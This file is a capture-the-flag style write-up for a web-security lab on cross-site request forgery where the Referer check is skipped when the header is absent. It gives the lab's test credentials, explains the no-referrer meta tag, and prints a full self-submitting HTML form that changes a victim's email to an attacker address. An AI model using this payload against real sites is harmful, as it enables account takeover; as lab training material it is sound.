@@ -1,0 +1,37 @@
+// Lab: CSRF where Referer validation depends on header being present
+
+This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+// Solution
+
+
+// Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
+
+// In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:
+
+<meta name="referrer" content="no-referrer" />
+
+
+
+So The following Exploit I inject to solve this lab:
+
+// Exploit
+
+<html>
+  <form
+    method="POST"
+    action="https://0a44007204ce32dd8547d19d007a00f7.web-security-academy.net/my-account/change-email"
+  >
+    <input type="hidden" name="email" value="bobby@evil.com" />
+  </form>
+  <meta name="referrer" content="no-referrer" />
+</html>
+<script>
+  document.forms[0].submit();
+</script>
